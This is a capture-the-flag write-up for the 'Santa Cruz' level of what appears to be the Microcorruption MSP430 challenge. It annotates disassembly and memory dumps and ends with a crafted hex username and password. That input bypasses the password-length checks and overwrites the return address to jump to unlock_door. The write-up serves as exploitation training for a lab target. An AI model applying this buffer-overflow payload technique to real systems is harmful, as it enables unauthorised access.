# Santa Cruz

This challenge was definitely harder, and i loved it! Lets get straight into it <br>

First things first:
- This challenge reads a **username** and a **password** from the user
- both with **0x63** (d:99) size and copied to other memory location using **strcpy**

After checking this, i went commenting the code while stepping throught the debugger (i'll show only what matters)

```assembly
4550 <login>

; -- snip --

45d0:  mov	r11, r15                    ; <- r11=43b5                    We control the value in r11, End of username  
45d2:  mov	r4, r14                     ; <- r04=43cc                    We control the value in r4, Aa @ pwd index 24th
45d4:  add	#0xffe8, r14                ; <- 0xffe8 + 0x43cc = 0x43b4    We control the result value, 
>    45d8:  inc	r14                     ; <- 0x43b5                      We control 
|    45da:  tst.b	0x0(r14)
45de:  jnz	#0x45d8 <login+0x88>        ; <- tries to find the end of input, calculating the password length
                                        ;  r14 = 4418         
                                        ; /\ input dependent, smaller string, finds a null byte sooner 
45e0:  mov	r14, r11                    ; <- we control the value in r14 (pwd len), r1 = pwd_len
45e2:  sub	r15, r11                    ; <- r11 = 0x4418 - 0x43b5 -  <=> r11 = 0x0063 
45e4:  mov.b	-0x18(r4), r15          ; <- r4-0x18 = 43b4   We control this, 3rd E in the username
45e8:  sxt	r15                         ; 
45ea:  cmp	r15, r11                    ; <- compare 0x45, 0x63 
45ec:  jnc	#0x45fa <login+0xaa>        ; <- jump not carry set
|    45ee:  mov	&0x2400, r15
|    45f2:  call	#0x4728 <puts>
V    45f6:  br	#0x4440 <__stop_progExec__>
45fa:  mov.b	-0x19(r4), r15          <- r4=0x43cc-0x19=43B3 ... 0x45 (2nd E)
45fe:  sxt	r15                         
4600:  cmp	r15, r11                    <- Checking against pwd_length
4602:  jc	#0x4610 <login+0xc0>        <- checks if greater, needs to be > 0x45 (username:Ec  the E value)
|    4604:  mov	&0x2402, r15
|    4608:  call	#0x4728 <puts>
V    460c:  br	#0x4440 <__stop_progExec__>
4610:  mov.b	#0x0, -0x2c(r4)         <- sp (not important)
        ; here is the INT call to the HSM-2 is being prepared, we dont care about this
```

```s
# this is the memory layout for the afore execution with this inputs
# username: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXZZZZ
# password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2
2400:   6a46 9646 4161 3041 6131 4161 3241 6133   jF.FAa0Aa1Aa2Aa3
2410:   4161 3441 6135 4161 3641 6137 4161 3841   Aa4Aa5Aa6Aa7Aa8A
2420:   6139 4162 3041 6231 4162 3241 6233 4162   a9Ab0Ab1Ab2Ab3Ab
2430:   3441 6235 4162 3641 6237 4162 3841 6239   4Ab5Ab6Ab7Ab8Ab9
2440:   4163 3041 6331 4163 3241 6333 4163 3441   Ac0Ac1Ac2Ac3Ac4A
2450:   6335 4163 3641 6337 4163 3841 6339 4164   c5Ac6Ac7Ac8Ac9Ad
2460:   3041 6431 4164 3200 0000 0000 0000 0000   0Ad1Ad2.........
2470:   *
4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
43a0:   0000 4141 4141 4242 4242 4343 4343 4444   ..AAAABBBBCCCCDD
43b0:   4444 4545 4541 6130 4161 3141 6132 4161   DDEEEAa0Aa1Aa2Aa
43c0:   3341 6134 4161 3541 6136 4161 3741 6138   3Aa4Aa5Aa6Aa7Aa8
43d0:   4161 3941 6230 4162 3141 6232 4162 3341   Aa9Ab0Ab1Ab2Ab3A
43e0:   6234 4162 3541 6236 4162 3741 6238 4162   b4Ab5Ab6Ab7Ab8Ab
43f0:   3941 6330 4163 3141 6332 4163 3341 6334   9Ac0Ac1Ac2Ac3Ac4
4400:   4163 3541 6336 4163 3741 6338 4163 3941   Ac5Ac6Ac7Ac8Ac9A
4410:   6430 4164 3141 6432 0001 2f83 9f4f 6a47   d0Ad1Ad2../..OjG
```

Before jumping into a more detailed explanation, we can see that the **username is trimmed** at the 3rd **E** (inclusive), and the password is placed right after it <br>

Since the program is writing in contiguous memory, we can input a smaller password and it will be placed within the username <br>

I wrote what the code does by its side, so its easier to follow along, but some notes may be taken:
- **0x45e4** (mov.b	-0x18(r4), r15) - We can control left operand
  - -0x18(r4) -> last username byte (0x45 -> E)
- **0x45ea** (cmp r15, r11) - compares both numbers (setting flags), we control both
  - r15 -> see prior bulletin
  - r11 -> password size
- **0x45ec** (jnc	#0x45fa ) - Checks if the carry flag is set (it is already set, so we need to somehow clear it)
    - If they are the same -> zero is set, carry unchanged
    - If r11 bigger -> carry set 1
    - if r15 smaller -> carry set 0, N set (negative)
- **0x45fa** (mov.b	-0x19(r4), r15) - moves the 2nd E from username to r15
- **0x4600** (cmp r15, r11) - checks against password length
  - r15 -> 0x45 (2nd E in the inputed username)
  - r11 -> unchanged (password length)
- **0x4602** (jc 0x4610) 
  - Jumps if carry set!
  - So we need r15 > r11

To bypass all this, as seen, we need a password that has its length delimited by the values present at the username input at indexes:
- Lower bound: username[17]
- Upper bound: username[18]
- Example
  - Username input: AAAABBBBCCCCDDDDEac
  - Lower bound (a): 61
  - Upper bound (c): 63

Alright, we know how to bypass some initial restrictions, lets check the rest of the code, shall we?! <br>

**Note:** the comments made on the lower portion of the code below were made after successfully hit the ret instruction. the memory shown further below does not match the input to achieve that, but rather a simple showcase of addresses and how to manipulate the execution flow through them

```assembly
; after the call to the HSM-2
4632:  add	#0x8, sp                                ; resetting the stack to our program   
4634:  tst.b	-0x2c(r4)                           ; checking the return address as it seems

; -- snip --

464c:  tst.b	-0x6(r4)                            ;-0x6(r4) => 0x43cc-0x6 = 0x43C6 <- we control this -> pwd[18]
4650:  jz	#0x465e <login+0x10e>                   ; checks if null byte at pwd[18]
4652:  mov	&0x2400, r15
4656:  call	#0x4728 <puts>
465a:  br	#0x4440 <__stop_progExec__>
465e:  add	#0x28, sp                               ; resetting the stack
4662:  pop	r4
4664:  pop	r11
4666:  ret                                          ; sp == 0x43cc <- we control this
```

```s
43b0:   4444 4545 4541 6130 4161 3141 6132 4161   DDEEEAa0Aa1Aa2Aa
43c0:   3341 6134 4161 3541 6136 4161 3741 6138   3Aa4Aa5Aa6Aa7Aa8
```

There's not much to add to what is already written as commentaries on the instructions side. We just need to be sure that the password has 17 chars (so the 18th is a null byte) <br>

Since the platform allows users to define the type of input to hex, we can set extremely low bounds when compared with ascii input (i.e: 6 < pwd_len < 8) <br>

Lets craft the input ! <br> 

#### username

What do we know?!
- We control the execution flow by delimiting the password length. 
- The password is inserted from the username's 20th byte onwards (inclusive)
- A null byte is needed @ 0x43cc -> the password needs to be 17 chars
- The ret address is at 

```bash
$username="AAAABBBBCCCCDDDDEEEEFFFF"
$crafted_username_pre_hex_="AAAABBBBCCCCDDDDE[LB][UB](password)(remaining username input)"
# where
# [LB] (lower bound) ->  1                              
# [UB] (upper bound) ->  18                               
#                                                         V V| password will be placed here  |     junk    |RET
$crafter_username_hex="4141414141414141414141414141414141011242424242434343434444444445454545464646464747474a44"
$password="AAAAAAAAAAAAAAAAA"           
```

**Note:** the username needs the "input as hex" checkbox checked so we can set lower password length bounds. the password doesn't <br>

And, with this input, we can control the program flow and return to the **unlock_door** (0x444a) function <br>

The door and the **Jakarta** level are **unlocked**  ;D